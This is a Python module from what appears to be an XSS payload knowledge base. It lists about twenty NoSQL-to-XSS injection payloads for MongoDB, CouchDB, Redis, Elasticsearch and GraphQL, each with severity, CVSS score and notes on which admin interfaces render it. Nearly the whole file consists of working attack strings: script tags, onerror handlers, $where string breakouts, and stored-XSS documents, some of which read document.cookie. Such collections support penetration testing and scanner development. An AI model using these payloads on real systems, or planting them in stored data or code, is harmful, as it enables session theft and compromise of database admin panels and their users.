#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Production
Telegram: https://t.me/EasyProTech

NoSQL-to-XSS Hybrid Payloads
MongoDB, CouchDB, Redis, Elasticsearch
Injections that result in XSS when rendered in web interfaces
"""

from ..models import PayloadEntry

NOSQL_XSS_PAYLOADS = {
    # === MongoDB Operator Injection (reflected in logs/errors) ===
    "nosql_mongo_ne_xss": PayloadEntry(
        payload='{"$ne": "<script>alert(document.domain)</script>"}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="MongoDB $ne operator with XSS payload. When query is logged or displayed in admin panel, XSS executes.",
        tags=["nosql", "mongodb", "operator", "$ne", "log-injection"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_where_xss": PayloadEntry(
        payload='{"$where": "this.name == \'<img src=x onerror=alert(1)>\'"}',
        contexts=["json", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="MongoDB $where with JavaScript containing XSS. Dangerous if query is reflected in UI.",
        tags=["nosql", "mongodb", "$where", "javascript"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_regex_xss": PayloadEntry(
        payload='{"$regex": "<script>alert(1)</script>", "$options": "i"}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="MongoDB $regex operator with XSS in pattern. Reflected in search result displays.",
        tags=["nosql", "mongodb", "$regex", "search"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_comment_xss": PayloadEntry(
        payload='{"$comment": "<img src=x onerror=alert(1)>", "user": "admin"}',
        contexts=["json"],
        severity="medium",
        cvss_score=6.5,
        description="MongoDB $comment field with XSS. Comments may be logged or displayed in profiler.",
        tags=["nosql", "mongodb", "$comment", "profiler"],
        reliability="medium",
        attack_surface="api",
    ),
    # === MongoDB JavaScript Execution ($where / mapReduce) ===
    "nosql_mongo_where_breakout": PayloadEntry(
        payload="'; return '<script>alert(1)</script>'; var a='",
        contexts=["json", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="MongoDB $where JavaScript string breakout for XSS injection in returned data",
        tags=["nosql", "mongodb", "$where", "breakout", "javascript"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_mapreduce_emit": PayloadEntry(
        payload="function() { emit('<script>alert(1)</script>', this.value); }",
        contexts=["json", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="MongoDB mapReduce emit() with XSS key. Results displayed in aggregation UI.",
        tags=["nosql", "mongodb", "mapreduce", "emit"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_error_injection": PayloadEntry(
        payload="throw new Error('<script>alert(1)</script>')",
        contexts=["json", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="MongoDB JavaScript error with XSS message. Error pages often render message unsanitized.",
        tags=["nosql", "mongodb", "error", "exception"],
        reliability="high",
        attack_surface="api",
    ),
    # === MongoDB Document Injection (Stored XSS) ===
    "nosql_mongo_field_xss": PayloadEntry(
        payload='{"username": "<img src=x onerror=alert(document.cookie)>", "role": "user"}',
        contexts=["json", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="MongoDB document with XSS in field value. Stored XSS when document is rendered.",
        tags=["nosql", "mongodb", "stored-xss", "document"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_mongo_key_xss": PayloadEntry(
        payload='{"<script>alert(1)</script>": "value"}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="MongoDB document with XSS in field key. Key names may be rendered in schema viewers.",
        tags=["nosql", "mongodb", "key", "schema"],
        reliability="medium",
        attack_surface="api",
    ),
    # === CouchDB ===
    "nosql_couch_view_xss": PayloadEntry(
        payload='{"_id": "<script>alert(1)</script>", "type": "user"}',
        contexts=["json"],
        severity="high",
        cvss_score=8.0,
        description="CouchDB document ID with XSS. IDs displayed in Fauxton admin interface.",
        tags=["nosql", "couchdb", "document-id", "fauxton"],
        reliability="high",
        attack_surface="api",
        known_affected=["couchdb", "fauxton"],
    ),
    "nosql_couch_attachment_name": PayloadEntry(
        payload='{"_attachments": {"<img src=x onerror=alert(1)>.txt": {"content_type": "text/plain", "data": ""}}}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="CouchDB attachment filename with XSS. Filenames rendered in attachment listings.",
        tags=["nosql", "couchdb", "attachment", "filename"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_couch_design_doc": PayloadEntry(
        payload='{"_id": "_design/<script>alert(1)</script>", "views": {}}',
        contexts=["json"],
        severity="critical",
        cvss_score=8.5,
        description="CouchDB design document name with XSS. Design docs listed in admin UI.",
        tags=["nosql", "couchdb", "design-doc", "admin"],
        reliability="high",
        attack_surface="api",
    ),
    # === Redis ===
    "nosql_redis_key_xss": PayloadEntry(
        payload="SET '<script>alert(1)</script>' 'value'",
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="Redis key with XSS payload. Keys displayed in Redis Commander/RedisInsight.",
        tags=["nosql", "redis", "key", "admin-ui"],
        reliability="high",
        attack_surface="api",
        known_affected=["redis-commander", "redisinsight"],
    ),
    "nosql_redis_value_xss": PayloadEntry(
        payload="SET user:profile '<img src=x onerror=alert(document.cookie)>'",
        contexts=["json", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Redis value with XSS. Stored XSS when value is retrieved and rendered.",
        tags=["nosql", "redis", "value", "stored-xss"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_redis_pubsub_xss": PayloadEntry(
        payload="PUBLISH alerts '<script>alert(1)</script>'",
        contexts=["json", "websocket"],
        severity="high",
        cvss_score=8.0,
        description="Redis Pub/Sub message with XSS. Real-time dashboards may render messages unsanitized.",
        tags=["nosql", "redis", "pubsub", "realtime"],
        reliability="high",
        attack_surface="api",
    ),
    # === Elasticsearch ===
    "nosql_elastic_field_xss": PayloadEntry(
        payload='{"index": {"_index": "users", "_id": "1"}}\\n{"name": "<script>alert(1)</script>"}',
        contexts=["json"],
        severity="critical",
        cvss_score=8.5,
        description="Elasticsearch document with XSS in field. Kibana displays field values in Discover.",
        tags=["nosql", "elasticsearch", "kibana", "stored-xss"],
        reliability="high",
        attack_surface="api",
        known_affected=["kibana"],
    ),
    "nosql_elastic_index_name": PayloadEntry(
        payload="PUT /<script>alert(1)</script>",
        contexts=["json", "url"],
        severity="high",
        cvss_score=7.5,
        description="Elasticsearch index name with XSS. Index names listed in Kibana Index Management.",
        tags=["nosql", "elasticsearch", "index", "kibana"],
        reliability="medium",
        attack_surface="api",
    ),
    "nosql_elastic_aggregation_xss": PayloadEntry(
        payload='{"aggs": {"xss": {"terms": {"field": "<script>alert(1)</script>"}}}}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="Elasticsearch aggregation with XSS in field name. Aggregation results in Kibana visualizations.",
        tags=["nosql", "elasticsearch", "aggregation", "kibana"],
        reliability="medium",
        attack_surface="api",
    ),
    # === JSON Polyglots (NoSQL + HTML) ===
    "nosql_polyglot_json_html": PayloadEntry(
        payload='{"user": "admin", "bio": "<svg/onload=alert(1)>"}',
        contexts=["json", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="JSON document valid for NoSQL storage, contains XSS in string field",
        tags=["nosql", "polyglot", "json", "html"],
        reliability="high",
        attack_surface="api",
    ),
    "nosql_polyglot_nested": PayloadEntry(
        payload='{"profile": {"avatar": "<img src=x onerror=alert(1)>", "settings": {"theme": "dark"}}}',
        contexts=["json", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Nested JSON with XSS in deep field. Complex objects may bypass shallow sanitization.",
        tags=["nosql", "polyglot", "nested", "deep"],
        reliability="high",
        attack_surface="api",
    ),
    # === GraphQL + NoSQL ===
    "nosql_graphql_mutation_xss": PayloadEntry(
        payload='mutation { createUser(input: {name: "<script>alert(1)</script>"}) { id } }',
        contexts=["json", "graphql", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="GraphQL mutation storing XSS in NoSQL backend. Persisted XSS via API.",
        tags=["nosql", "graphql", "mutation", "stored-xss"],
        reliability="high",
        attack_surface="api",
    ),
}

NOSQL_XSS_TOTAL = len(NOSQL_XSS_PAYLOADS)
